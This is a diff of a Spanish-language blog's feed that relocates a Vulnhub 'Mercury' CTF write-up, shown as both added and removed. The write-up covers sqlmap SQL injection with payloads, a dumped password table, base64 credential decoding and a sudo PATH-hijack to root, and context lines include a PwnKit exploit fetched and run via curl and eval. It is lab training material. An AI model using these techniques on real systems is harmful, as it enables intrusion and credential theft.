@@ -449,9 +449,176 @@ Shellcodes: No Results
 	</entry>
 	
 	<entry>
+		<title>Vulnhub #4: Mercury</title>
+		<link href="https://update-me.com/posts/mercury/"/>
+		<updated>2025-05-11T00:00:00+00:00</updated>
+		<id>https://update-me.com/posts/mercury/</id>
+		<content type="html">
+		  &lt;p&gt;Puedes descargar la maquina vulnerable desde &lt;a href=&quot;https://www.vulnhub.com/entry/the-planets-mercury,544/&quot;&gt;vulnhub&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;datos&quot;&gt;Datos &lt;a class=&quot;direct-link&quot; href=&quot;#datos&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;IP Atacante: 192.168.0.25&lt;br&gt;
+IP Victima: 192.168.0.31&lt;/p&gt;
+&lt;h2 id=&quot;recon&quot;&gt;Recon &lt;a class=&quot;direct-link&quot; href=&quot;#recon&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap &lt;a class=&quot;direct-link&quot; href=&quot;#nmap&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;datadiego@~ nmap -Pn 192.168.0.31
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 10:50 CET
+Nmap scan report for 192.168.0.31
+Host is up (0.0013s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8080/tcp open  http-proxy
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;web&quot;&gt;Web &lt;a class=&quot;direct-link&quot; href=&quot;#web&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;En la maquina hay un servidor http, en el index solo hay un mensaje en plano:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Hello. This site is currently in development please check back later.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Existe un robots.txt:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;User-agent: * 
+Disallow: /
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Si intentamos entrar a cualquier otra pagina que no existe:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+Page not found (404)
+Request Method: 	GET
+Request URL: 	http://192.168.0.31:8080/hello
+
+Using the URLconf defined in mercury_proj.urls, Django tried these URL patterns, in this order:
+
+    [name=&#39;index&#39;]
+    robots.txt [name=&#39;robots&#39;]
+    mercuryfacts/
+
+The current path, hello, didn&#39;t match any of these.
+
+You&#39;re seeing this error because you have DEBUG = True in your Django settings file. Change that to False, and Django will display a standard 404 page.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora sabemos que el servidor es un django, y que existe un endpoint &lt;code&gt;mercuryfacts&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Cuando accedemos a /mercuryfacts encontramos otros dos endpoints:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;/mercuryfacts/todo&lt;/li&gt;
+&lt;li&gt;/mercuryfacts/:number&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;En la lista de /todo:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; Still todo:
+
+    Add CSS.
+    Implement authentication (using users table)
+    Use models in django instead of direct mysql call
+    All the other stuff, so much!!!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Lanzamos sqlmap:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sqlmap -u http://192.168.0.31:8080/mercuryfacts/ --dbs --batch
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Encuentra lo siguiente:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sqlmap identified the following injection point(s) with a total of 1876 HTTP(s) requests:
+---
+Parameter: #1* (URI)
+    Type: error-based
+    Title: MySQL &amp;gt;= 5.6 error-based - Parameter replace (GTID_SUBSET)
+    Payload: http://192.168.0.31:8080/mercuryfacts/GTID_SUBSET(CONCAT(0x7170706b71,(SELECT (ELT(7619=7619,1))),0x7170707a71),7619)
+
+    Type: time-based blind
+    Title: MySQL &amp;gt;= 5.0.12 time-based blind - Parameter replace
+    Payload: http://192.168.0.31:8080/mercuryfacts/(CASE WHEN (5772=5772) THEN SLEEP(5) ELSE 5772 END)
+
+    Type: UNION query
+    Title: MySQL UNION query (random number) - 1 column
+    Payload: http://192.168.0.31:8080/mercuryfacts/-9431 UNION ALL SELECT CONCAT(0x7170706b71,0x746152665350437975484f575550785542644a64465743704a555253535467456c67735377476378,0x7170707a71)#
+---
+[05:11:02] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL &amp;gt;= 5.6
+[05:11:02] [INFO] fetching database names
+available databases [2]:
+[*] information_schema
+[*] mercury
+
+[05:11:02] [INFO] fetched data logged to text files under &#39;/home/kali/.local/share/sqlmap/output/192.168.0.31&#39;
+
+[*] ending @ 05:11:02 /2025-02-11/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Sacamos datos de las tablas con:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sqlmap -u http://192.168.0.31:8080/mercuryfacts/ --current-db -D mercury --batch --dump-all
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Encontramos lo siguiente:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[05:50:50] [INFO] fetching entries for table &#39;users&#39; in database &#39;mercury&#39;
+Database: mercury
+Table: users
+[4 entries]
++----+-------------------------------+-----------+
+| id | password                      | username  |
++----+-------------------------------+-----------+
+| 1  | johnny1987                    | john      |
+| 2  | lovemykids111                 | laura     |
+| 3  | lovemybeer111                 | sam       |
+| 4  | mercuryisthesizeof0.056Earths | webmaster |
++----+-------------------------------+-----------+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ningun usuario funciona en SSH excepto &lt;code&gt;webmaster&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Encontramos la user_flag.txt:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;user_flag_8339915c9a454657bd60ee58776f4ccd
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En &lt;code&gt;/etc/passwd&lt;/code&gt; encontramos otro usuario:&lt;br&gt;
+linuxmaster:x:1002:1002:,,,:/home/linuxmaster:/bin/bash&lt;/p&gt;
+&lt;p&gt;Encontramos el hash de ambos:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;webmaster@mercury:~$ cat mercury_proj/notes.txt 
+Project accounts (both restricted):
+webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
+linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Descodificamos la contraseña:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;webmaster@mercury:~/mercury_proj/mercury_proj$ echo &amp;quot;bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==&amp;quot; | base64 -d
+mercurymeandiameteris4880km
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Entramos por SSH o mediante &lt;code&gt;su linuxmaster&lt;/code&gt; y comprobamos permisos con sudo -l:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;linuxmaster@mercury:~$ sudo -l
+[sudo] password for linuxmaster: 
+Matching Defaults entries for linuxmaster on mercury:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin&#92;:/usr/local/bin&#92;:/usr/sbin&#92;:/usr/bin&#92;:/sbin&#92;:/bin&#92;:/snap/bin
+
+User linuxmaster may run the following commands on mercury:
+    (root : root) SETENV: /usr/bin/check_syslog.sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Comprobamos el archivo:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;linuxmaster@mercury:~$ cat /usr/bin/check_syslog.sh 
+#!/bin/bash
+tail -n 10 /var/log/syslog
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;El comando se esta ejecutando directamente, sin especificar la ruta absoluta, por lo que es vulnerable a &lt;code&gt;path hijacking&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Podemos hacer lo siguiente:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;linuxmaster@mercury:~$ mkdir /tmp/malito
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Dentro del directorio, creamos un &lt;code&gt;.sh&lt;/code&gt; que ejecute una shell con nano:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/bin/bash
+/bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Damos permisos con &lt;code&gt;chmod +x /tmp/malito/tail&lt;/code&gt;.&lt;br&gt;
+Exportamos la variable con &lt;code&gt;export PATH=/tmp/malito:$PATH&lt;/code&gt;&lt;br&gt;
+Ejecutamos el script utilizando la variable de entorno con &lt;code&gt;sudo --preserve-env=PATH /usr/bin/check_syslog.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Obtenemos acceso a root!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;linuxmaster@mercury:~$ cd /tmp/malito/
+linuxmaster@mercury:/tmp/malito$ ls
+linuxmaster@mercury:/tmp/malito$ nano tail
+linuxmaster@mercury:/tmp/malito$ ls
+tail
+linuxmaster@mercury:/tmp/malito$ chmod +x /tmp/malito/tail 
+linuxmaster@mercury:/tmp/malito$ export PATH=/tmp/malito:$PATH
+linuxmaster@mercury:/tmp/malito$ sudo --preserve-env=PATH /usr/bin/check_syslog.sh 
+[sudo] password for linuxmaster: 
+root@mercury:/tmp/malito# whoami
+root
+root@mercury:/tmp/malito# 
+&lt;/code&gt;&lt;/pre&gt;
+
+			
+		</content>
+	</entry>
+	
+	<entry>
 		<title>Vulnhub #3: Venus</title>
 		<link href="https://update-me.com/posts/venus/"/>
-		<updated>2025-05-10T00:00:00+00:00</updated>
+		<updated>2025-05-11T00:00:00+00:00</updated>
 		<id>https://update-me.com/posts/venus/</id>
 		<content type="html">
 		  &lt;p&gt;Puedes descargar la maquina desde &lt;a href=&quot;https://www.vulnhub.com/entry/the-planets-venus,705/&quot;&gt;vulnhub&lt;/a&gt;&lt;/p&gt;
@@ -704,173 +871,6 @@ P4{@
 &lt;p&gt;Encontramos un exploit:&lt;br&gt;
 &lt;a href=&quot;https://github.com/berdav/CVE-2021-4034/tree/main&quot;&gt;https://github.com/berdav/CVE-2021-4034/tree/main&lt;/a&gt;&lt;/p&gt;
 &lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;magellan@venus ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token builtin class-name&quot;&gt;eval&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;curl&lt;/span&gt; -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&quot;&lt;/span&gt;&lt;br&gt;cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c&lt;br&gt;cc -Wall    cve-2021-4034.c   -o cve-2021-4034&lt;br&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;module UTF-8// PWNKIT// pwnkit 1&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; gconv-modules&lt;br&gt;&lt;span class=&quot;token function&quot;&gt;mkdir&lt;/span&gt; -p &lt;span class=&quot;token assign-left variable&quot;&gt;GCONV_PATH&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;.&lt;br&gt;&lt;span class=&quot;token function&quot;&gt;cp&lt;/span&gt; -f /usr/bin/true &lt;span class=&quot;token assign-left variable&quot;&gt;GCONV_PATH&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;./pwnkit.so:.&lt;br&gt;sh-5.1&lt;span class=&quot;token comment&quot;&gt;# whoami&lt;/span&gt;&lt;br&gt;root&lt;/code&gt;&lt;/pre&gt;
-
-			
-		</content>
-	</entry>
-	
-	<entry>
-		<title>Vulnhub #4: Mercury</title>
-		<link href="https://update-me.com/posts/mercury/"/>
-		<updated>2025-05-11T00:00:00+00:00</updated>
-		<id>https://update-me.com/posts/mercury/</id>
-		<content type="html">
-		  &lt;p&gt;Puedes descargar la maquina vulnerable desde &lt;a href=&quot;https://www.vulnhub.com/entry/the-planets-mercury,544/&quot;&gt;vulnhub&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&quot;datos&quot;&gt;Datos &lt;a class=&quot;direct-link&quot; href=&quot;#datos&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;IP Atacante: 192.168.0.25&lt;br&gt;
-IP Victima: 192.168.0.31&lt;/p&gt;
-&lt;h2 id=&quot;recon&quot;&gt;Recon &lt;a class=&quot;direct-link&quot; href=&quot;#recon&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap &lt;a class=&quot;direct-link&quot; href=&quot;#nmap&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-&lt;pre&gt;&lt;code&gt;datadiego@~ nmap -Pn 192.168.0.31
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 10:50 CET
-Nmap scan report for 192.168.0.31
-Host is up (0.0013s latency).
-Not shown: 998 closed tcp ports (conn-refused)
-PORT     STATE SERVICE
-22/tcp   open  ssh
-8080/tcp open  http-proxy
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&quot;web&quot;&gt;Web &lt;a class=&quot;direct-link&quot; href=&quot;#web&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;En la maquina hay un servidor http, en el index solo hay un mensaje en plano:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Hello. This site is currently in development please check back later.
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Existe un robots.txt:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;User-agent: * 
-Disallow: /
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Si intentamos entrar a cualquier otra pagina que no existe:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;
-Page not found (404)
-Request Method: 	GET
-Request URL: 	http://192.168.0.31:8080/hello
-
-Using the URLconf defined in mercury_proj.urls, Django tried these URL patterns, in this order:
-
-    [name=&#39;index&#39;]
-    robots.txt [name=&#39;robots&#39;]
-    mercuryfacts/
-
-The current path, hello, didn&#39;t match any of these.
-
-You&#39;re seeing this error because you have DEBUG = True in your Django settings file. Change that to False, and Django will display a standard 404 page.
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Ahora sabemos que el servidor es un django, y que existe un endpoint &lt;code&gt;mercuryfacts&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;Cuando accedemos a /mercuryfacts encontramos otros dos endpoints:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;/mercuryfacts/todo&lt;/li&gt;
-&lt;li&gt;/mercuryfacts/:number&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;En la lista de /todo:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt; Still todo:
-
-    Add CSS.
-    Implement authentication (using users table)
-    Use models in django instead of direct mysql call
-    All the other stuff, so much!!!
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Lanzamos sqlmap:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;sqlmap -u http://192.168.0.31:8080/mercuryfacts/ --dbs --batch
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Encuentra lo siguiente:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;sqlmap identified the following injection point(s) with a total of 1876 HTTP(s) requests:
----
-Parameter: #1* (URI)
-    Type: error-based
-    Title: MySQL &amp;gt;= 5.6 error-based - Parameter replace (GTID_SUBSET)
-    Payload: http://192.168.0.31:8080/mercuryfacts/GTID_SUBSET(CONCAT(0x7170706b71,(SELECT (ELT(7619=7619,1))),0x7170707a71),7619)
-
-    Type: time-based blind
-    Title: MySQL &amp;gt;= 5.0.12 time-based blind - Parameter replace
-    Payload: http://192.168.0.31:8080/mercuryfacts/(CASE WHEN (5772=5772) THEN SLEEP(5) ELSE 5772 END)
-
-    Type: UNION query
-    Title: MySQL UNION query (random number) - 1 column
-    Payload: http://192.168.0.31:8080/mercuryfacts/-9431 UNION ALL SELECT CONCAT(0x7170706b71,0x746152665350437975484f575550785542644a64465743704a555253535467456c67735377476378,0x7170707a71)#
----
-[05:11:02] [INFO] the back-end DBMS is MySQL
-back-end DBMS: MySQL &amp;gt;= 5.6
-[05:11:02] [INFO] fetching database names
-available databases [2]:
-[*] information_schema
-[*] mercury
-
-[05:11:02] [INFO] fetched data logged to text files under &#39;/home/kali/.local/share/sqlmap/output/192.168.0.31&#39;
-
-[*] ending @ 05:11:02 /2025-02-11/
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Sacamos datos de las tablas con:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;sqlmap -u http://192.168.0.31:8080/mercuryfacts/ --current-db -D mercury --batch --dump-all
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Encontramos lo siguiente:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;[05:50:50] [INFO] fetching entries for table &#39;users&#39; in database &#39;mercury&#39;
-Database: mercury
-Table: users
-[4 entries]
-+----+-------------------------------+-----------+
-| id | password                      | username  |
-+----+-------------------------------+-----------+
-| 1  | johnny1987                    | john      |
-| 2  | lovemykids111                 | laura     |
-| 3  | lovemybeer111                 | sam       |
-| 4  | mercuryisthesizeof0.056Earths | webmaster |
-+----+-------------------------------+-----------+
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Ningun usuario funciona en SSH excepto &lt;code&gt;webmaster&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;Encontramos la user_flag.txt:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;user_flag_8339915c9a454657bd60ee58776f4ccd
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;En &lt;code&gt;/etc/passwd&lt;/code&gt; encontramos otro usuario:&lt;br&gt;
-linuxmaster:x:1002:1002:,,,:/home/linuxmaster:/bin/bash&lt;/p&gt;
-&lt;p&gt;Encontramos el hash de ambos:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;webmaster@mercury:~$ cat mercury_proj/notes.txt 
-Project accounts (both restricted):
-webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
-linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Descodificamos la contraseña:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;webmaster@mercury:~/mercury_proj/mercury_proj$ echo &amp;quot;bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==&amp;quot; | base64 -d
-mercurymeandiameteris4880km
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Entramos por SSH o mediante &lt;code&gt;su linuxmaster&lt;/code&gt; y comprobamos permisos con sudo -l:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;linuxmaster@mercury:~$ sudo -l
-[sudo] password for linuxmaster: 
-Matching Defaults entries for linuxmaster on mercury:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin&#92;:/usr/local/bin&#92;:/usr/sbin&#92;:/usr/bin&#92;:/sbin&#92;:/bin&#92;:/snap/bin
-
-User linuxmaster may run the following commands on mercury:
-    (root : root) SETENV: /usr/bin/check_syslog.sh
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Comprobamos el archivo:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;linuxmaster@mercury:~$ cat /usr/bin/check_syslog.sh 
-#!/bin/bash
-tail -n 10 /var/log/syslog
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;El comando se esta ejecutando directamente, sin especificar la ruta absoluta, por lo que es vulnerable a &lt;code&gt;path hijacking&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;Podemos hacer lo siguiente:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;linuxmaster@mercury:~$ mkdir /tmp/malito
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Dentro del directorio, creamos un &lt;code&gt;.sh&lt;/code&gt; que ejecute una shell con nano:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;#!/bin/bash
-/bin/bash
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Damos permisos con &lt;code&gt;chmod +x /tmp/malito/tail&lt;/code&gt;.&lt;br&gt;
-Exportamos la variable con &lt;code&gt;export PATH=/tmp/malito:$PATH&lt;/code&gt;&lt;br&gt;
-Ejecutamos el script utilizando la variable de entorno con &lt;code&gt;sudo --preserve-env=PATH /usr/bin/check_syslog.sh&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;Obtenemos acceso a root!&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;linuxmaster@mercury:~$ cd /tmp/malito/
-linuxmaster@mercury:/tmp/malito$ ls
-linuxmaster@mercury:/tmp/malito$ nano tail
-linuxmaster@mercury:/tmp/malito$ ls
-tail
-linuxmaster@mercury:/tmp/malito$ chmod +x /tmp/malito/tail 
-linuxmaster@mercury:/tmp/malito$ export PATH=/tmp/malito:$PATH
-linuxmaster@mercury:/tmp/malito$ sudo --preserve-env=PATH /usr/bin/check_syslog.sh 
-[sudo] password for linuxmaster: 
-root@mercury:/tmp/malito# whoami
-root
-root@mercury:/tmp/malito# 
-&lt;/code&gt;&lt;/pre&gt;
 
 			
 		</content>
